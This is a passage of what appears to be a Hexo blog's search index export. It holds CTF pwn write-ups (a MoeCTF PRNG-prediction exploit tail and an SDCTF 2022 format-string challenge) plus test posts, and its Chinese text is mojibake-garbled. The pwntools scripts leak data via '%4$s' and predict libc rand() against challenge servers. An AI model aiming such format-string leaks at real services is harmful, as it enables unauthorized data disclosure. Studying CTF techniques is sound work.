class="line">p.sendlineafter(<span class="string">&quot;password: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">seed = u64(p.recvline(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line"></span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v8 = libc.rand()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me the number you guess now.\n&quot;</span>, <span class="built_in">str</span>(v8))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>MoeCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<p>hello world</p>
<span id="more"></span>
<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><pre><code>$ hexo new &quot;My New Post&quot;
</code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3><span id="run-server">Run server</span></h3><pre><code>$ hexo server
</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3><span id="generate-static-files">Generate static files</span></h3><pre><code>$ hexo generate
</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><pre><code>$ hexo deploy
</code></pre>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>[SDCTF 2022]printFAILED å¤ç°</title>
    <url>/%5BSDCTF%202022%5DprintFAILED%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[SDCTF 2022]printFAILED å¤ç°</p>
<span id="more"></span>

<h1><span id="printfailed">printFAILED</span></h1><p>è¿™æ˜¯ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå‡ºçš„æ¯”è¾ƒç‰¹åˆ«ï¼Œç‰¹åˆ«æœäº†ä¸‹ï¼Œè·Ÿå¤§å®¶åˆ†æä¸€ä¸‹</p>
<p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œå‘ç°æŒ‰æ­£å¸¸å¥—è·¯æ±‚ä¸å‡ºåç§»</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>å†çœ‹çœ‹idaï¼Œå‘ç°é‡Œé¢æœ‰flag.txtï¼Œä½†æ˜¯è¢«scrambleå‡½æ•°æ‰“ä¹±äº†ï¼Œéœ€è¦æˆ‘ä»¬guessï¼Œåœ¨printfé‚£ä¸€è¡Œä¹Ÿå‡ºç°äº†flagï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æŠŠflagçš„å†…å®¹æ‰“å°å‡ºæ¥</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/2.png"></p>
<p>ncä¸€ä¸‹ï¼Œå‘ç°flagå­˜åœ¨ç¬¬å››ä¸ªå‚æ•°ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¼ å‚çš„è§„å®šï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å­˜æ”¾åœ¨rdiï¼Œå› æ­¤printfå‡½æ•°ä¼šä»rsiå¼€å§‹å¯»æ‰¾å‚æ•°ï¼‰ï¼Œå¾—åˆ°çš„è¿™ä¸²ä»£ç æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒflagäº†ï¼Œæœ‰ç‚¹é‚£å‘³äº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥çœ‹çœ‹scrambleå‡½æ•°æ˜¯æ€ä¹ˆæ‰“ä¹±flag</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/4.png"></p>
<hr>
<blockquote>
<h2><span id="scrambleå‡½æ•°">scrambleå‡½æ•°</span></h2><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸º scramble çš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªæ•´å‹å‚æ•° a1ã€‚è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯å¯¹å…¨å±€å˜é‡ flag ä¸­çš„å‰ a1 ä¸ªå­—ç¬¦è¿›è¡Œé€’å¢ã€‚</p>
<p>åœ¨å‡½æ•°å†…éƒ¨ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªåä¸º i çš„å¾ªç¯è®¡æ•°å™¨å˜é‡ã€‚ç„¶åä½¿ç”¨ä¸€ä¸ªæ— é™å¾ªç¯æ¥éå† flag å˜é‡ä¸­çš„å‰ a1 ä¸ªå­—ç¬¦ã€‚åœ¨æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå‡½æ•°éƒ½ä¼šå°† flag[i] å˜é‡çš„å€¼é€’å¢ 1ã€‚</p>
<p>å½“å¾ªç¯è®¡æ•°å™¨ i çš„å€¼å¤§äºç­‰äº a1 æ—¶ï¼Œå¾ªç¯ç»“æŸï¼Œå‡½æ•°è¿”å› i çš„å€¼ã€‚</p>
</blockquote>
<p>è¿™é‡Œæˆ‘çŸ¥è¯†æœ‰é™ï¼Œçœ‹ä¸å‡ºè¿™æ˜¯ä»€ä¹ˆåŠ å¯†çš„ï¼Œåˆ«äººç”¨æŒ‰ä½è¿ç®—subæ¥è§£ç ï¼Œç›´æ¥å¯ä»¥å¾—åˆ°flag</p>
<p><img src="/images/%5BSDCTF2022%5DprintFAILED%E5%A4%8D%E7%8E%B0/5.png"></p>
<hr>
<h2><span id="expå¦‚ä¸‹">expå¦‚ä¸‹ï¼š</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./printFailed&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28789</span>)</span><br><span class="line"> </span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">&quot;%4$s&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x = p.recvline()</span><br><span class="line">y = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        y+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p>åšè¿™é“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é¢˜ï¼Œä¹Ÿç®—æ˜¯ç»™æˆ‘å¼€é˜”äº†è‡ªå·±çš„è§†é‡ï¼Œè¿˜æ˜¯è¦å¥½å¥½åŠ å¼ºè‡ªå·±çš„èƒ½åŠ›ï¼Œå†²å†²å†²ï¼Œå¹²å°±å®Œäº‹äº†ï¼ï¼ï¼</p>
<p><strong>Video Tutorial</strong>:
<a href="https://www.youtube.com/watch?v=gSLdg4mipYs%EF%BC%88%E6%AD%A4%E9%A2%98%E8%AE%B2%E8%A7%A3%E7%9A%84%E8%A7%86%E9%A2%91%EF%BC%89">https://www.youtube.com/watch?v=gSLdg4mipYsï¼ˆæ­¤é¢˜è®²è§£çš„è§†é¢‘ï¼‰</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>highlight-test</title>
    <url>/highlight-test/</url>
    <content><![CDATA[<p>é«˜äº®éƒ¨åˆ†ä¿®æ”¹</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰“å° Hello World åˆ°ç»ˆç«¯</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>)  <span class="comment"># âœ… è¾“å‡ºè¯­å¥</span></span><br></pre></td></tr></table></figure>

<p>å•Šå•Šå•Š</p>
]]></content>
  </entry>
  <entry>
    <title>ç®€å•çš„ Hexo æ–‡ç« ç¤ºä¾‹</title>
    <url>/%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>è¿™æ˜¯ä¸€ç¯‡éå¸¸ç®€å•çš„ Hexo æ–‡ç« ç¤ºä¾‹ã€‚</p>
<span id="more"></span>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ Hexo å‘½ä»¤æ“ä½œä»£ç å—ï¼š</p>
<pre><code>hexo clean
hexo generate
hexo server
</code></pre>
<p>ä½ å¯ä»¥æŠŠè¿™æ®µä»£ç å¤åˆ¶åˆ°ç»ˆç«¯æ‰§è¡Œï¼Œå¯åŠ¨ä½ çš„ Hexo æœ¬åœ°æœåŠ¡å™¨ã€‚</p>
<pre><code>askjdhfkj
asljndkflj
sljkdfkljd
</code></pre>
<p>ä½ æ˜¯çœŸçš„å¸…</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// æ‰“å° Hello World åˆ°ç»ˆç«¯</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>); <span class="comment">// è¾“å‡ºè¯­å¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çŸ¥é“å—
å•Šå•Šå•Š
ä½ å¥½ç†Šä¹‹ä¹‹</p>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>demo</tag>
      </tags>
  </entry>
</search>
